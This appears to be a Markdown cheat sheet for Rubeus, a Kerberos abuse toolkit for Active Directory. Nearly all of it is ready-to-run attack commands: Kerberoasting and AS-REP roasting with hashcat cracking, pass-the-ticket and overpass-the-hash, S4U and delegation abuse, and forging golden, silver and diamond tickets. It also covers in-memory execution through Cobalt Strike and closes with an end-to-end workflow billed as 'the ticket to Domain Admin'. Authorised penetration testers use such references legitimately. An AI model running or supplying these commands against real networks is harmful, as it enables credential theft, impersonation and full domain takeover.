# 🎫 Rubeus - Kerberos Abuse Toolkit

```
  ██████╗ ██╗   ██╗██████╗ ███████╗██╗   ██╗███████╗
  ██╔══██╗██║   ██║██╔══██╗██╔════╝██║   ██║██╔════╝
  ██████╔╝██║   ██║██████╔╝█████╗  ██║   ██║███████╗
  ██╔══██╗██║   ██║██╔══██╗██╔══╝  ██║   ██║╚════██║
  ██║  ██║╚██████╔╝██████╔╝███████╗╚██████╔╝███████║
  ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝
           Kerberos Interaction & Abuse
```

<p align="center">
  <img src="https://img.shields.io/badge/Rubeus-Kerberos-red?style=for-the-badge" alt="Rubeus">
  <img src="https://img.shields.io/badge/Active_Directory-blue?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/C%23-green?style=for-the-badge" alt="C#">
</p>

---

## 📋 Table of Contents

- [What is Rubeus](#-what-is-rubeus)
- [Ticket Operations](#-ticket-operations)
- [Kerberoasting](#-kerberoasting)
- [AS-REP Roasting](#-as-rep-roasting)
- [Ticket Attacks](#-ticket-attacks)
- [Delegation Attacks](#-delegation-attacks)
- [Golden & Silver Tickets](#-golden--silver-tickets)
- [Quick Reference](#-quick-reference)

---

## 🎯 What is Rubeus

**Rubeus** is a C# toolkit for Kerberos interaction and abuse:

- 🎫 **Ticket Operations** - Request, renew, describe tickets
- 🔓 **Kerberoasting** - Extract service ticket hashes
- 🔑 **AS-REP Roasting** - Attack users without preauth
- 🎭 **Pass-the-Ticket** - Reuse stolen tickets
- ✨ **Golden/Silver Tickets** - Forge tickets

---

## 🚀 Basic Usage

### Running Rubeus

```powershell
# Direct execution
.\Rubeus.exe <command> [options]

# Execute in memory (Cobalt Strike)
execute-assembly Rubeus.exe <command>

# Load via PowerShell
[System.Reflection.Assembly]::LoadFile("C:\path\Rubeus.exe")
```

---

## 🎟️ Ticket Operations

### Request TGT

```powershell
# With password
.\Rubeus.exe asktgt /user:admin /password:P@ssw0rd /domain:domain.local

# With NTLM hash
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /domain:domain.local

# With AES256 key
.\Rubeus.exe asktgt /user:admin /aes256:AESKEY /domain:domain.local

# With certificate
.\Rubeus.exe asktgt /user:admin /certificate:cert.pfx /password:pfxpass

# Output to file
.\Rubeus.exe asktgt /user:admin /password:P@ssw0rd /outfile:ticket.kirbi
```

### Request TGS

```powershell
# Request service ticket
.\Rubeus.exe asktgs /ticket:base64ticket /service:cifs/server.domain.local

# With TGT from file
.\Rubeus.exe asktgs /ticket:ticket.kirbi /service:http/server.domain.local
```

### List Tickets

```powershell
# List current user tickets
.\Rubeus.exe triage

# List all tickets (requires admin)
.\Rubeus.exe triage /luid:0x3e7

# Detailed ticket dump
.\Rubeus.exe dump
```

### Pass-the-Ticket

```powershell
# Import ticket to current session
.\Rubeus.exe ptt /ticket:base64ticket

# Import from file
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Create new logon session and import
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe ptt /ticket:ticket.kirbi /luid:0x123456
```

### Describe Ticket

```powershell
# Show ticket details
.\Rubeus.exe describe /ticket:base64ticket

# From file
.\Rubeus.exe describe /ticket:ticket.kirbi
```

---

## 🍖 Kerberoasting

### Basic Kerberoast

```powershell
# Kerberoast all SPNs
.\Rubeus.exe kerberoast

# Output to file (hashcat format)
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# Target specific user
.\Rubeus.exe kerberoast /user:sqlservice

# RC4 downgrade (etype 23)
.\Rubeus.exe kerberoast /rc4opsec
```

### Advanced Kerberoasting

```powershell
# With specific TGT
.\Rubeus.exe kerberoast /ticket:base64tgt

# Stats only (no tickets)
.\Rubeus.exe kerberoast /stats

# Target specific SPN
.\Rubeus.exe kerberoast /spn:MSSQLSvc/sql.domain.local

# AES encryption (stealthier)
.\Rubeus.exe kerberoast /aes

# Filter by user
.\Rubeus.exe kerberoast /user:svc_sql /nowrap
```

### Cracking Kerberoast Hashes

```bash
# Hashcat (mode 13100)
hashcat -m 13100 kerberoast.txt wordlist.txt

# John
john --wordlist=rockyou.txt kerberoast.txt
```

---

## 🔓 AS-REP Roasting

### Basic AS-REP Roast

```powershell
# Find and roast users without preauth
.\Rubeus.exe asreproast

# Output to file
.\Rubeus.exe asreproast /outfile:asrep.txt

# Target specific user
.\Rubeus.exe asreproast /user:targetuser

# Hashcat format
.\Rubeus.exe asreproast /format:hashcat
```

### Cracking AS-REP Hashes

```bash
# Hashcat (mode 18200)
hashcat -m 18200 asrep.txt wordlist.txt
```

---

## 🎭 Ticket Attacks

### Overpass-the-Hash (Pass-the-Key)

```powershell
# Get TGT with hash, create new session
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# With AES key
.\Rubeus.exe asktgt /user:admin /aes256:AESKEY /ptt

# Create sacrificial process
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe asktgt /user:admin /rc4:HASH /ptt /luid:0x123456
```

### S4U (Service for User)

```powershell
# S4U2Self - impersonate user to self
.\Rubeus.exe s4u /user:serviceaccount /rc4:HASH /impersonateuser:admin /msdsspn:cifs/target.domain.local

# S4U2Proxy - impersonate to another service
.\Rubeus.exe s4u /ticket:tgt.kirbi /impersonateuser:admin /msdsspn:cifs/dc.domain.local /altservice:ldap

# Full chain
.\Rubeus.exe s4u /user:svc /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

---

## 🔀 Delegation Attacks

### Unconstrained Delegation

```powershell
# Monitor for TGTs on unconstrained delegation host
.\Rubeus.exe monitor /interval:5 /nowrap

# Specific filter
.\Rubeus.exe monitor /targetuser:DC$ /interval:5

# Harvest TGTs
.\Rubeus.exe harvest /interval:30
```

### Constrained Delegation

```powershell
# Request ticket for allowed service
.\Rubeus.exe s4u /user:svcaccount /rc4:HASH /impersonateuser:administrator /msdsspn:time/dc.domain.local /altservice:cifs /ptt
```

### Resource-Based Constrained Delegation

```powershell
# After configuring RBCD with PowerMad/PowerView
# Request ticket as attacker machine
.\Rubeus.exe s4u /user:attackermachine$ /rc4:MACHINEACCOUNTHASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

---

## ✨ Golden & Silver Tickets

### Golden Ticket

```powershell
# Create golden ticket (requires krbtgt hash)
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGTHASH /ptt

# Specify groups
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /groups:512,513,519 /ptt

# With AES key
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /aes256:AESKEY /ptt
```

### Silver Ticket

```powershell
# Create silver ticket (requires service account hash)
.\Rubeus.exe silver /service:cifs/target.domain.local /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /rc4:SERVICEHASH /ptt

# LDAP service (DCSync)
.\Rubeus.exe silver /service:ldap/dc.domain.local /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /rc4:DCHASH /ptt
```

### Diamond Ticket

```powershell
# Modified legitimate TGT
.\Rubeus.exe diamond /user:admin /password:P@ssw0rd /enctype:aes /domain:domain.local /dc:dc.domain.local /ticketuser:administrator /ticketuserid:500 /groups:512 /ptt
```

---

## 📊 Quick Reference

### Essential Commands

| Command | Description |
|---------|-------------|
| `asktgt` | Request TGT |
| `asktgs` | Request TGS |
| `kerberoast` | Extract service ticket hashes |
| `asreproast` | AS-REP roasting |
| `ptt` | Pass-the-Ticket |
| `s4u` | Service for User |
| `golden` | Forge golden ticket |
| `silver` | Forge silver ticket |
| `dump` | Dump all tickets |
| `triage` | List tickets |

### Authentication Options

| Option | Description |
|--------|-------------|
| `/user:` | Username |
| `/password:` | Password |
| `/rc4:` | NTLM hash |
| `/aes256:` | AES256 key |
| `/ticket:` | Base64 ticket |

### Common Options

| Option | Description |
|--------|-------------|
| `/ptt` | Pass-the-Ticket |
| `/outfile:` | Output to file |
| `/nowrap` | Don't wrap base64 |
| `/domain:` | Target domain |
| `/dc:` | Domain Controller |

### Attack Workflow

```powershell
# 1. Kerberoast
.\Rubeus.exe kerberoast /outfile:kerb.txt

# 2. Crack hashes
hashcat -m 13100 kerb.txt rockyou.txt

# 3. Get TGT with cracked password
.\Rubeus.exe asktgt /user:svc /password:CrackedPass /ptt

# 4. Or overpass-the-hash
.\Rubeus.exe asktgt /user:admin /rc4:HASH /ptt

# 5. Access resources
dir \\server\share
```

---

## 📚 Resources

- [Rubeus GitHub](https://github.com/GhostPack/Rubeus)
- [HarmJ0y Blog](https://blog.harmj0y.net/)
- [SpecterOps](https://specterops.io/)

### Related Cheatsheets
- [BloodHound](../BloodHound/README.md)
- [Impacket](../Impacket/README.md)
- [Mimikatz](../Mimikatz/README.md)

---

<p align="center">
  <b>🎫 Master Kerberos!</b><br>
  <i>Rubeus - The ticket to Domain Admin</i>
</p>
